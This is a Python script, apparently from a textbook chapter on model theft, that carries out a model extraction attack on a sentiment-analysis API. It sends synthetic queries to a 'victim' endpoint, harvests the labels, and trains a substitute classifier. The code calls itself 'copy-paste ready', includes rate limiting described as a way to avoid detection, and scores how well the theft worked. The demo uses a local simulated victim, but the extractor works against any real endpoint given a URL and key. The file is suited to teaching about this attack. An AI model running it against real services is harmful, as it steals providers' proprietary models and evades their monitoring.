#!/usr/bin/env python3
"""
Practical Example - Steal a Sentiment Classifier

Source: Chapter_20_Model_Theft_and_Membership_Inference
Category: model_attacks
"""

import requests
import numpy as np
import json
from sklearn.linear_model import LogisticRegression
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.metrics import accuracy_score
import time

import argparse
import sys

#!/usr/bin/env python3
"""
Complete Model Extraction Attack Example
Copy-paste ready - extracts a sentiment analysis model via API queries

Requirements:
    pip install requests numpy scikit-learn

Usage:
    python model_extraction_demo.py
"""

class ModelExtractor:
    """Extract a model via black-box API queries"""

    def __init__(self, victim_api_url, api_key=None):
        self.victim_url = victim_api_url
        self.api_key = api_key
        self.queries = []
        self.labels = []
        self.substitute_model = None
        self.vectorizer = None

    def query_victim_model(self, text):
        """Query the victim API and get prediction"""
        headers = {'Content-Type': 'application/json'}
        if self.api_key:
            headers['Authorization'] = f'Bearer {self.api_key}'

        payload = {'text': text}

        try:
            response = requests.post(
                self.victim_url,
                headers=headers,
                json=payload,
                timeout=10
            )
            response.raise_for_status()

            # Extract prediction from response
            result = response.json()
            prediction = result.get('sentiment') or result.get('label')
            confidence = result.get('confidence', 1.0)

            return prediction, confidence

        except requests.exceptions.RequestException as e:
            print(f"Query failed: {e}")
            return None, None

    def generate_queries(self, num_queries=1000, strategy='random'):
        """
        Generate diverse queries to maximize coverage

        Strategies:
        - random: Random word combinations
        - synthetic: Template-based generation
        - real_data: Use public datasets (more effective)
        """
        queries = []

        if strategy == 'random':
            # Simple random generation
            word_bank = [
                'good', 'bad', 'excellent', 'terrible', 'amazing', 'awful',
                'love', 'hate', 'best', 'worst', 'great', 'horrible',
                'movie', 'product', 'service', 'experience', 'quality',
                'recommend', 'avoid', 'disappointed', 'satisfied', 'happy'
            ]

            for _ in range(num_queries):
                # Create 5-10 word sentences
                words = np.random.choice(word_bank, size=np.random.randint(5, 11))
                query = ' '.join(words)
                queries.append(query)

        elif strategy == 'synthetic':
            # Template-based generation
            templates = [
                "This {item} is {adj}",
                "I {feeling} this {item}",
                "{adj} {item}, would {action} recommend",
                "The {item} was {adj} and {adj}"
            ]

            items = ['product', 'movie', 'service', 'experience', 'purchase']
            adjs = ['great', 'terrible', 'amazing', 'awful', 'excellent', 'poor']
            feelings = ['love', 'hate', 'like', 'dislike', 'enjoy']
            actions = ['highly', 'not', 'definitely', 'never']

            for _ in range(num_queries):
                template = np.random.choice(templates)
                query = template.format(
                    item=np.random.choice(items),
                    adj=np.random.choice(adjs),
                    feeling=np.random.choice(feelings),
                    action=np.random.choice(actions)
                )
                queries.append(query)

        return queries

    def collect_training_data(self, num_queries=500, batch_size=10):
        """
        Query victim model to build training dataset
        Uses rate limiting to avoid detection
        """
        print(f"[*] Generating {num_queries} queries...")
        queries = self.generate_queries(num_queries, strategy='synthetic')

        print(f"[*] Querying victim model (batch size: {batch_size})...")

        for i in range(0, len(queries), batch_size):
            batch = queries[i:i+batch_size]

            for query in batch:
                prediction, confidence = self.query_victim_model(query)

                if prediction:
                    self.queries.append(query)
                    self.labels.append(prediction)

            # Rate limiting to avoid detection
            if i % 50 == 0:
                print(f"    Progress: {len(self.labels)}/{num_queries} queries")
                time.sleep(1)  # Be polite to API

        print(f"[+] Collected {len(self.labels)} labeled samples")
        return len(self.labels)

    def train_substitute_model(self):
        """
        Train substitute model on stolen labels
        """
        if len(self.queries) < 10:
            print("[!] Not enough training data")
            return False

        print("[*] Training substitute model...")

        # Vectorize text
        self.vectorizer = TfidfVectorizer(max_features=1000)
        X = self.vectorizer.fit_transform(self.queries)

        # Train classifier
        self.substitute_model = LogisticRegression(max_iter=1000)
        self.substitute_model.fit(X, self.labels)

        # Calculate training accuracy
        train_preds = self.substitute_model.predict(X)
        train_acc = accuracy_score(self.labels, train_preds)

        print(f"[+] Substitute model trained (accuracy: {train_acc:.2%})")
        return True

    def predict(self, text):
        """Use stolen substitute model for prediction"""
        if not self.substitute_model:
            raise ValueError("Must train substitute model first")

        X = self.vectorizer.transform([text])
        prediction = self.substitute_model.predict(X)[0]
        probabilities = self.substitute_model.predict_proba(X)[0]

        return prediction, max(probabilities)

    def evaluate_theft_success(self, test_queries):
        """
        Compare substitute model to victim on test set
        High agreement = successful theft
        """
        print("[*] Evaluating model theft success...")

        victim_preds = []
        substitute_preds = []

        for query in test_queries:
            # Get victim prediction
            victim_pred, _ = self.query_victim_model(query)
            if victim_pred:
                victim_preds.append(victim_pred)

                # Get substitute prediction
                sub_pred, _ = self.predict(query)
                substitute_preds.append(sub_pred)

        # Calculate agreement rate
        agreement = accuracy_score(victim_preds, substitute_preds)
        print(f"[+] Model agreement: {agreement:.2%}")
        print(f"    (Higher = better theft)")

        return agreement

# ============================================================================
# DEMO USAGE
# ============================================================================

if __name__ == "__main__":
    print("="*60)
    print("Model Extraction Attack Demo")
    print("="*60)

    # SETUP: Configure victim API
    # Replace with actual API endpoint
    VICTIM_API = "https://api.example.com/sentiment"  # Change this!
    API_KEY = "your-api-key-here"  # Optional

    # For demo purposes, we'll simulate the victim
    print("\n[DEMO MODE] Simulating victim API locally\n")

    class SimulatedVictim:
        """Simulates a victim sentiment API for demo"""
        def __init__(self):
            # Simple keyword-based classifier
            self.positive_words = {'good', 'great', 'excellent', 'love', 'best', 'amazing'}
            self.negative_words = {'bad', 'terrible', 'awful', 'hate', 'worst', 'horrible'}

        def predict(self, text):
            text_lower = text.lower()
            pos_count = sum(1 for word in self.positive_words if word in text_lower)
            neg_count = sum(1 for word in self.negative_words if word in text_lower)

            if pos_count > neg_count:
                return 'positive', 0.8
            elif neg_count > pos_count:
                return 'negative', 0.8
            else:
                return 'neutral', 0.5

    victim = SimulatedVictim()

    # Override query method to use simulation
    extractor = ModelExtractor(VICTIM_API)
    extractor.query_victim_model = lambda text: victim.predict(text)

    # Step 1: Collect training data via queries
    print("Step 1: Querying victim model to steal predictions...")
    extractor.collect_training_data(num_queries=100, batch_size=10)

    # Step 2: Train substitute model
    print("\nStep 2: Training substitute model...")
    extractor.train_substitute_model()

    # Step 3: Test stolen model
    print("\nStep 3: Testing stolen model...")
    test_samples = [
        "This product is amazing!",
        "Terrible experience, would not recommend",
        "It's okay, nothing special",
    ]

    for sample in test_samples:
        prediction, confidence = extractor.predict(sample)
        print(f"  '{sample}'")
        print(f"    → Predicted: {prediction} (confidence: {confidence:.2%})")

    # Step 4: Measure theft success
    print("\nStep 4: Evaluating model theft success...")
    test_queries = extractor.generate_queries(50, strategy='synthetic')
    agreement = extractor.evaluate_theft_success(test_queries)

    print("\n" + "="*60)
    if agreement > 0.8:
        print("[SUCCESS] Model successfully stolen!")
        print(f"Substitute model agrees with victim {agreement:.1%} of the time")
    else:
        print("[PARTIAL] Model partially extracted")
        print(f"Need more queries to improve agreement from {agreement:.1%}")
    print("="*60)
